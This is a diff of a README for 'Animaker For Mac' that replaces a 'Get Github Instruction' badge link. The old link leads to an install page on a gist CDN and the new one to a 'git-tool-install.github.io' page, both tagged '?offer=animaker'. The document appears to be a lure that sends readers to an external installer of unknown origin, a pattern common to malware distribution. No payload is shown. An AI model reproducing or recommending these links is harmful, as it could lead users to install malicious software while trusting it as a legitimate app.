@@ -3,7 +3,7 @@
 
 🎨 **Animaker For Mac** brings professional animation capabilities directly to your desktop. Create stunning animated videos, explainer clips, and presentations effortlessly. 😃  
 
-[![Get Github Instruction](https://img.shields.io/badge/Get%20Github%20Instruction-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/flamesong104/c3a19355ba1229c268d665ffea72f996/raw/7ba8a49a2994b04e30c54866cca3b8eae98584db/install.html?offer=animaker)
+[![Get Github Instruction](https://img.shields.io/badge/Get%20Github%20Instruction-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-tool-install.github.io/.github/?offer=animaker)
 
 
 ---
